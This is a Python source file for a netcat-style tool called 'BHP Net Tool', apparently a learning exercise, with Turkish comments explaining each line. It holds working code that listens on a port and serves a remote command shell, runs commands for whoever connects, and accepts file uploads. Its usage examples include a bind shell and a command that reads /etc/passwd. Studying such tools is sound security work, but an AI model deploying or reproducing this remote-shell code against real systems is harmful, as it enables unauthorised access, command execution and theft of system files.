import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


def execute(cmd): #execute fonksiyonu baglantidan sonra gonderilen komutlari hedefte calistiriyor ve hedeften istemciye gonderiliyor
    """Execute a command on the local system and return its output.""" #cmd argumani burada komutlari alir
    cmd = cmd.strip() #komutta gereksiz karakterleri kaldirir bosluk gibi
    if not cmd: #eger hic bir komut verilmezse hic bir komut gitmez
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT) #komutu calistir
    return output.decode() #komut ciktisini alir


class NetCat: #socket baglantisi kurmak icin sinif olusturuyor yani tum baglanti bu sinif uzerinden olacak
    def __init__(self, args, buffer=None): #args parametresini sinifin tum fonksiyonlarinda kullanilabilir yapiyoruz, bufferde ayni sekilde, None vermemizin sebebi eger buffer girilmezse hata vermesin diye
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket sunucusunu baslatiyoruz, initde vermemizin sebebi hem diger fonksiyonlarda socket metodlarina rahat ulasmak icin hemde sinifi calistirdigimizda socket sunucusunun baslatilmasi icin
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #socket baglantinin devamli olmasi icin bir ayar

    def run(self): #bu fonksiyon hedef ve istemciyi belirliyor. Yani
        if self.args.listen: #kod calistirildiginda l parametresinin verilip verilmedigini yokluyoruz
            self.listen() #eger l parametresi verilmisse listen fonksiyonunu cagiriyoruz
        else:
            self.send() #eger l parametresi verilmemisse sunucuya baslatan degilde baglanan oluyoruz send fonksiyonunu cagirarak

    def send(self): #listener yapan hedefe baglanmak icin bu fonksiyonu olusturuyoruz
        """Connect to a target and send/receive data interactively."""
        self.socket.connect((self.args.target, self.args.port)) #initde baslatdigimiz socket sunucusunun connect metodunu kullanip, arguman olarak port ve hedef ipsi veriliyor
        if self.buffer: #eger komut verilmisse socket'in send fonksiyonu ile komutu gonderiyoruz burada buffer gonderliecek komutu temsil ediyor
            self.socket.send(self.buffer)

        try: #try, except kullanmamizin sebebi eger listener ve ya hedefden biri baglantiyi durdurdugunda hata vermemesi
            while True: #birden fazla istek yapmak icin while kullanmamiz gerek. Yani birden fazla komut gonderip cikti alabilmek icin
                recv_len = 1 #veriyi yani komutun ciktisini kontrol etmek icin ne zaman recv_len 4096 dan kucuk olursa o zaman en sonra veri gelmis demektir. Verilen en fazla 4096 olarak gelebiliyor bunu yapmamizin sebebi ciktilari kesilmis bir sekilde almamak
                response = '' #ciktiyi burada toplayacagiz
                while recv_len: #recv_len i while ile 4096'dan buyuk oldugu surece donguye sokuyoruz
                    data = self.socket.recv(4096) #socket uzerinden gelen verileri aliyoruz
                    recv_len = len(data) #recv_len'in 4096'dan kucuk olup olmadigin yoklamak icin
                    response += data.decode() #alinan verileri topluyoruz yani birlestiriyoruz surekli, alinan veriler bytes olarak alinir o yuzden decode ile metine ceviriyoruz
                    if recv_len < 4096:
                        break #eger alinan verilen bittiyse donguyu durduruyoruz
                if response: #eger response bos degilse yazdiriyoruz
                    print(response)
                buffer = input("> ") #komutu buradan aliyoruz
                buffer += '\n' #komutlari karismamasi icin yeni satir ekliyoruz
                self.socket.send(buffer.encode()) #gonderilecek komutu metinden bytes'e ceviriyoruz alindiginda yeniden decode edilecek
        except KeyboardInterrupt: #eger ctrl+c ile ve ya ctrl+z ile baglanti durduruldugunda hata verilemsin diye veriyoruz
            print("User terminated.")
            self.socket.close() #suncuyu kapatiyoruz
            sys.exit() #koddan cikiyoruz

    def listen(self): #eger kullanici -l argumanini girecekse araci baslatdiginda bu fonksiyon calisacak
        """Set up a listener and handle incoming connections."""
        self.socket.bind((self.args.target, self.args.port)) #arguman olarak verilen ip adresi ve port veriliyor
        self.socket.listen(5) #en fazla 5 dinleme baslatabilme yani 5 sunucu
        while True: #istemci baslatilan porta ve ip adresini girip baglanmaya calistiginda baglantinin surekli olmasi icin veriliyor
            client_socket, _ = self.socket.accept() #istemci port ve ip adresini girdiginde bu isteki kabul etmek icin
            client_thread = threading.Thread(target=self.handle, args=(client_socket,)) #ayni anda fazla istemcinin baglanabilmesi icin kullaniyoruz yani her istemci ayri ayri islenebiliyor
            client_thread.start() #bu paralleligi baslatiyoruz

    def handle(self, client_socket): #istemciden gelen istekleri islemek icin
        """Handle client connections and perform requested actions."""
        if self.args.execute: #ilk istemcinin sunucuya baglanirken e argumanini kullanip kullanmadigini kontrol ediyoruz
            output = execute(self.args.execute) #eger e argumani verilmisse kodun basinda yazdigimiz bu argumani islyecek fonksiyonu cagiriyoruz. e argumani istemcinin sunucuya bir komutu calistirip ciktisini gondermek  istemesidir
            client_socket.send(output.encode()) #komut ciktisini byte formatinda gonderiyoruz (protokol geregi boyle olmasi gerekiyor)
        elif self.args.upload: #eger istemci -u argumanini kullanirsa upload islemini baslatiyoruz. u argumani istemcinin herhangi bir dosya icerigini sunucuya gondermek istemesidir
            file_buffer = b'' #bos bir bayt dizisi olusturuyoruz dosya icerigini bu degiskene atamak icin. byte dizisi olmasinin sebebi verilerin byte formatinda gitmek zorunda olmasi
            while True: #while kullanmamizin sebebi dosyanin iceriginin 4096dan cok oldugunda verinin kesilmemesi icin yani hepsinin gitmesi icin
                data = client_socket.recv(4096) #dosyanin ilk 4096 bytini data degiskenine atiyoruz
                if data: #eger data bos degilse data icerigini daha once olusturdugumuz byte dizisine atiyoruz
                    file_buffer += data
                else: #eger data bossa demek ki artik dosyada data'ya atinalacak veri kalmamis demekdir bu yuzden break ile donguyu sonlandirabiliriz
                    break
            with open(self.args.upload, 'wb') as f: #
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f"Server killed: {e}")
                    self.socket.close()
                    sys.exit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="BHP Net Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c    # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt  # upload file
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"  # execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135  # echo text to server
            netcat.py -t 192.168.1.108 -p 5555  # connect to server
        """),
    )
    parser.add_argument("-c", "--command", action="store_true", help="command shell")
    parser.add_argument("-e", "--execute", help="execute specified command")
    parser.add_argument("-l", "--listen", action="store_true", help="listen mode")
    parser.add_argument("-p", "--port", type=int, default=5555, help="specified port")
    parser.add_argument("-t", "--target", default="192.168.1.203", help="specified IP")
    parser.add_argument("-u", "--upload", help="upload file")
    args = parser.parse_args()

    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()
